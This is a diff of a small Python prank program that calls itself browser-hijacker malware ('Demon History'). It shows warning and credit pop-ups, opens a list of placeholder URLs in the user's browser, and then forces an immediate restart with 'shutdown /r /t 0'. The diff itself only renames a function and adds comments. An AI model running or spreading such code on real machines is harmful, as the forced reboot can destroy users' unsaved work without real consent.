@@ -5,15 +5,19 @@ import time
 
 
 def warning_message():
-  # Warn the user about the malware before starting and credits
+  # Warn the user about the malware before starting using Messagebox
   
   messagebox.showwarning("WARNING", "This is a Browser Hijacker, a type of Malware! Do you still want to run this? If not, close the Terminal window. The X button will not work!")
+  
+  #Credits using messagebox
+  
   messagebox.showinfo("Credits","Demon History...Created by Chickenthe4th...Programed in Python...Version 1")
   
 
 
-def URLs():
-  # Url list the malware will open 
+def OpenURLs():
+  # Url list the malware will open on the users browser
+  
   URLS = [
     "https://example.com/",
     "https://example.com/",
@@ -26,12 +30,15 @@ for url in URLS:
 
 
 def Shutdown_PC():
+  #Shutdown PC after URLs open
+
+  
   time.sleep(2)
   os.system("shutdown /r /t 0")
 
 def main():
   warning_message()
-  URLs()
+  OpenURLs()
   Shutdown_PC()
 
 if __name__ == "__main__":
